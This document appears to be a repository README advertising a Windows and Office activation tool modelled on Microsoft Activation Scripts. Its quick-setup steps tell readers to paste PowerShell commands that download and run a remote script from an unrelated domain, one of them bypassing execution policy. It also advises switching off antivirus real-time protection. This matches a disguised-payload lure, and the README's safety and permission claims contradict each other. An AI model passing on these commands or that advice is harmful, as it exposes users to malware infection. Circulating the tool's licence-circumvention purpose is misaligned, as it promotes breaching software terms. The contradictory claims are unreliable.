<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & Online KMS for Windows 11

![preview](https://raw.githubusercontent.com/developermartinez/windows-office-activation-suite/main/showcase_906c.svg)

[![stars](https://img.shields.io/badge/Stars-4.8%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-5.1%2B-ec4899?style=flat&labelColor=0d1117)]() [![build](https://img.shields.io/badge/Build-Passing-2ea44f?style=flat&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-3.4K-f472b6?style=flat&labelColor=0d1117)]() [![system](https://img.shields.io/badge/System-Win_10%2F11-db2777?style=flat&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Office installations through four distinct methods: HWID, Ohook, TSforge, and Online KMS. Each method targets a specific activation scenario, from permanent digital licensing on Windows 10/11 to offline activation for legacy systems and subscription-based Office products. The suite supports Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, automatically detecting the installed edition and current activation state. Built on native Windows activation APIs, it avoids core system file modification and provides backup, restore, and reversible activation workflows for consistent, repeatable deployment.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Prepare PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the install command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**Activation Methods**

- **HWID** — Generates a hardware-bound digital license for Windows 10 and Windows 11 that persists across reboots and does not require periodic renewal.
- **Ohook** — Provides permanent Office activation by hooking the licensing verification path in memory, leaving installation files untouched.
- **TSforge** — Enables offline activation for legacy Windows releases where modern licensing endpoints are unavailable.
- **Online KMS** — Performs KMS-based activation for Windows and Office products that rely on volume licensing channels.

**Platform Coverage**

- Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, and LTSC editions.
- Windows Server 2016, 2019, and 2022.
- Microsoft Office 2010 through 2021 and Office 365, including all retail and volume editions.

**Edition and State Detection**

- Automatically identifies the installed Windows edition and installed Office products before activation.
- Displays current licensing status, remaining grace periods, and channel type (retail, volume, or subscription).
- Selects a compatible activation method based on the detected product and edition.

**Backup and Restore**

- Exports the current activation state to a local backup before any changes are applied.
- Restores a previously saved activation state, allowing rollback to the pre-activation configuration.

**Extended Security Updates**

- Applies ESU licensing for Windows 7 and Windows 10 installations that are outside standard support windows.

**Operational Characteristics**

- Runs entirely from a single elevated PowerShell session with no installer, background service, or persistent process.
- Uses native Windows activation APIs and does not patch, replace, or inject into core system files.
- Requires no network connection after the initial script retrieval; activation steps complete offline.
- Reversible: all applied changes can be removed through the built-in restore option.
- Maintained against cumulative Windows updates that affect licensing components.

**Safety and Transparency**

- Full source code is publicly available for audit.
- No DLL injection and no modification of protected system binaries.
- Activation state changes are logged to the console for verification.

## How It Works

Windows-Activation-Suite operates entirely through native Windows activation interfaces and does not inject libraries into running processes or patch core system binaries. Each activation method targets a distinct layer of the Windows licensing stack, and the suite selects the appropriate mechanism based on the detected operating system edition, product type, and user-selected mode.

**Activation pipeline**

1. **Environment discovery** — The suite enumerates the installed Windows or Office edition, build number, architecture, and current licensing state. This determines which activation methods are compatible and prevents mismatched operations.
2. **Method selection** — Based on the detected product, the suite maps the installation to the supported method: HWID for Windows 10/11 digital licensing, Ohook for Office, TSforge for offline activation on legacy Windows, or Online KMS for volume-licensed products.
3. **Execution** — The selected method is applied through the corresponding native API surface or service interaction. No permanent modification is written to protected system files.
4. **Verification** — The suite queries the resulting license status and reports the activation state to the user.

**HWID activation**

HWID activation generates a hardware-bound digital license by submitting a valid ticket request to the Windows licensing service. The resulting license is tied to the machine's hardware fingerprint and persists across reinstalls of the same edition on the same hardware, without requiring a product key or periodic renewal.

**Ohook activation**

Ohook provides persistent Office activation by hooking the Office licensing verification path at load time rather than modifying installed Office binaries. The hook intercepts license checks and returns a valid state, leaving the underlying Office installation intact. Because it operates at runtime, it survives Office updates that do not alter the hooked entry points.

**TSforge activation**

TSforge performs offline activation for older Windows versions by generating and installing a local activation token through the legacy licensing infrastructure. This method requires no network connectivity after execution and is suited to systems where online activation endpoints are unavailable or deprecated.

**Online KMS activation**

Online KMS activation routes license requests through a KMS endpoint, applying a volume license state to Windows or Office products that support KMS. This method is used for editions and products where permanent activation methods are not applicable, and it relies on periodic renewal against the KMS infrastructure.

**Operational characteristics**

- Activation is applied through native licensing APIs; the suite does not modify kernel components or protected system files.
- HWID and Ohook produce persistent activation states, while KMS-based activation follows the standard renewal cycle.
- The suite reports the detected edition and resulting activation status after each operation, allowing verification before and after execution.
- Activation state can be backed up and restored, and applied changes are reversible through the suite's restore path.
- All logic executes locally on the target machine; no third-party service is contacted beyond the licensing endpoints required by the chosen method.

## Compatibility

Windows-Activation-Suite is designed for broad coverage across the Microsoft ecosystem while keeping a single, consistent execution path. Each activation method is matched to the product families and editions it supports, and the suite performs automatic edition and channel detection before applying any method.

**Windows Client**

- **Windows 11** — Home, Pro, Enterprise, Education, Pro for Workstations, and IoT Enterprise editions are supported through HWID digital licensing, with Online KMS available as an alternative path for volume-style environments.
- **Windows 10** — Home, Pro, Enterprise, Education, and LTSC/LTSB editions are supported via HWID, with Online KMS available for editions where digital licensing is not applicable.
- **Windows 8.1 / 8** — Core, Pro, and Enterprise editions are handled through TSforge offline activation or Online KMS.
- **Windows 7** — Home, Pro, Ultimate, and Enterprise editions are supported through TSforge offline activation or Online KMS, including Extended Security Updates scenarios where applicable.

**Windows Server**

Server SKUs from 2016 through 2022 are supported through Online KMS activation, covering Standard and Datacenter editions. Edition detection distinguishes server builds from client builds so that the correct activation path is selected automatically.

**Microsoft Office**

- **Office 365** — Subscription installations are activated through Ohook, which operates at the local licensing layer without requiring a network connection after initial setup.
- **Office 2021 / 2019 / 2016** — Retail and volume editions are supported through Ohook for permanent activation, with Online KMS available for volume-license scenarios.
- **Office 2013 / 2010** — All editions are supported through Ohook or Online KMS, depending on the installed license type.

**Architecture and Environment**

The suite runs on both x86 and x64 Windows installations and operates entirely through native Windows activation APIs and the built-in licensing infrastructure. No DLL injection, driver installation, or modification of core system files is performed, which keeps the tool compatible with standard system integrity mechanisms and reversible through the built-in restore option.

**Method-to-Product Matrix**

| Method | Windows 7 / 8 / 8.1 | Windows 10 / 11 | Windows Server | Office 2010–2021 | Office 365 |
|---|---|---|---|---|---|
| HWID | — | ✓ | — | — | — |
| TSforge | ✓ | — | — | — | — |
| Ohook | — | — | — | ✓ | ✓ |
| Online KMS | ✓ | ✓ | ✓ | ✓ | — |

**Compatibility Notes**

Activation persistence can be affected by major feature updates and cumulative platform changes; in such cases, re-running the suite restores the prior state. Hardware-bound HWID licenses remain tied to the machine's digital fingerprint, so significant hardware changes may require reactivation. The suite is intended for use only on installations you own, and compatibility is validated against genuine, unmodified Windows and Office builds.

## FAQ

**Q: What distinguishes the HWID method from Online KMS in this suite?**

A: HWID generates a hardware-bound digital license that persists across reboots and does not require periodic renewal, making it suitable for Windows 10 and 11 editions. Online KMS relies on a remote key management service and requires re-activation at defined intervals; it is the appropriate path for volume editions and server SKUs where digital licensing is unavailable.

**Q: How does Ohook activate Office without contacting Microsoft servers?**

A: Ohook intercepts the Office licensing verification path at runtime and supplies a locally validated license state, so no external activation request is issued. This yields persistent Office activation across the 2010 through 2021 and 365 product lines, independent of network availability after the initial run.

**Q: When should TSforge be selected over the other methods?**

A: TSforge is intended for legacy platforms — Windows 7, 8, and 8.1 — where HWID digital licensing is not supported and online KMS endpoints may be unreachable. It performs offline activation against the local licensing store, which makes it the correct choice for air-gapped or end-of-life systems.

**Q: Does the suite modify core system binaries or inject DLLs?**

A: No. All methods operate through native Windows activation APIs and the standard licensing infrastructure. Core system files are left untouched, which keeps the activation reversible and reduces conflict surface with system integrity checks.

**Q: Is activation retained after a feature update or in-place upgrade?**

A: HWID and Ohook activation typically survive minor cumulative updates. Major feature updates or in-place upgrades can reset the licensing state; re-running the suite restores activation. TSforge and Online KMS activations should be re-verified after any platform-level upgrade.

**Q: Can the suite operate in an environment without internet access?**

A: Yes, provided the appropriate method is chosen. TSforge and Ohook complete activation locally. HWID and Online KMS require an initial connection to reach their respective validation endpoints; subsequent operation is offline.

**Q: Does the suite detect the installed Windows edition automatically?**

A: Yes. Edition and product detection runs before method selection, and the suite reports the current activation state so the operator can confirm the correct target before applying a method.

**Q: Can a prior activation state be backed up and restored?**

A: Yes. The suite exposes backup and restore operations for the activation state, allowing the previous licensing configuration to be captured before changes and reinstated afterward.

**Q: Which products are covered?**

A: Windows 7, 8, 8.1, 10, 11, and Windows Server 2016 through 2022; Office 2010, 2013, 2016, 2019, 2021, and 365. Method availability varies by product — consult the compatibility matrix for the mapping.

**Q: What permissions are required to run the suite?**

A: Administrative elevation is required for all activation methods, since they interact with the system licensing service and protected registry hives. Running without elevation will fail at the licensing write stage.

**Q: Is this project the original Microsoft Activation Scripts?**

A: No. Windows-Activation-Suite is an independent open-source project built on the methods and concepts established by the upstream Microsoft Activation Scripts work. Credit for the original methodology belongs to those developers.

**Q: What is the licensing terms position on usage?**

A: The suite is distributed for educational and research purposes. Activating unlicensed software contravenes Microsoft's Terms of Service; use is restricted to installations you own or are authorized to license.

## Disclaimer

Windows-Activation-Suite is provided strictly as an open-source, educational reference implementation of native Windows and Office activation mechanisms. It is intended for use by developers, system administrators, and security researchers studying how HWID, Ohook, TSforge, and Online KMS activation methods interact with the Windows Software Protection Platform and Office licensing subsystems on systems they own or are explicitly authorized to administer.

The software is distributed on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The maintainers make no representations or guarantees regarding the accuracy, reliability, completeness, or fitness of the tool for any particular deployment scenario, and accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from its use, misuse, or inability to use.

Activating Windows, Windows Server, or Microsoft Office without a valid license violates the Microsoft Software License Terms and may contravene applicable local, national, or international law. It is the sole responsibility of the end user to ensure that any use of this software complies with all applicable licensing agreements and legal requirements. This project does not condone, encourage, or facilitate the circumvention of software licensing, and the maintainers expressly disclaim any responsibility for such use.

The tool operates exclusively through native Windows activation APIs and does not inject DLLs, patch core system binaries, or modify protected system files. It is designed to be reversible: activation state can be inspected, backed up, and restored, and the tool can be removed without leaving persistent system-level modifications. Nevertheless, running any activation tool carries inherent risk, including potential interaction with Windows Update, antivirus heuristics, or enterprise management policies. Users should validate behavior in an isolated environment before deploying to production or managed systems.

Certain activation methods, particularly KMS-based approaches, are time-limited and may require periodic renewal; HWID and Ohook methods produce persistent activation tied to hardware or configuration state and may be affected by significant hardware changes, major Windows feature updates, or reinstallation. The maintainers do not guarantee continuity of activation across such events and provide no support for reactivation on unlicensed installations.

This project is derived from and acknowledges the open-source Microsoft Activation Scripts work; all credit for the underlying research and methodology belongs to the original authors. Windows-Activation-Suite is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. All product names, trademarks, and registered trademarks are the property of their respective owners and are used here for identification purposes only.

By downloading, executing, or otherwise using this software, you acknowledge that you have read and understood this disclaimer and agree to assume full responsibility for your use of the tool and its consequences.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code, binaries, and accompanying documentation. Under its terms, you are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the original copyright notice and this permission notice are included in all copies or substantial portions of the software. The license imposes no warranty obligations on downstream users and carries no copyleft requirements, allowing the codebase to be integrated into both open-source and proprietary workflows.

The MIT License is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability — whether in an action of contract, tort, or otherwise — arising from, out of, or in connection with the software or its use.

**Attribution and provenance.** Windows-Activation-Suite is derived from the open-source Microsoft Activation Scripts project and retains its original authorship and licensing terms. All credit for the foundational activation techniques belongs to the original developers. Modifications, extensions, and maintenance introduced by the Windows-Activation-Suite maintainers are released under the same MIT terms to preserve compatibility and transparency across downstream forks.

**Scope of the license.** The MIT License covers the source code, scripts, and documentation contained in this project. It does not grant any rights to Microsoft trademarks, product keys, or proprietary activation infrastructure, nor does it constitute legal advice. Users are solely responsible for ensuring their use of the software complies with applicable laws and the terms of service of any software being activated. The license grant does not imply endorsement by, affiliation with, or authorization from Microsoft Corporation.

**Contributions.** By submitting a pull request, patch, or other contribution to Windows-Activation-Suite, you agree that your contribution is licensed under the same MIT terms and that you have the right to grant this license. No separate contributor license agreement is required.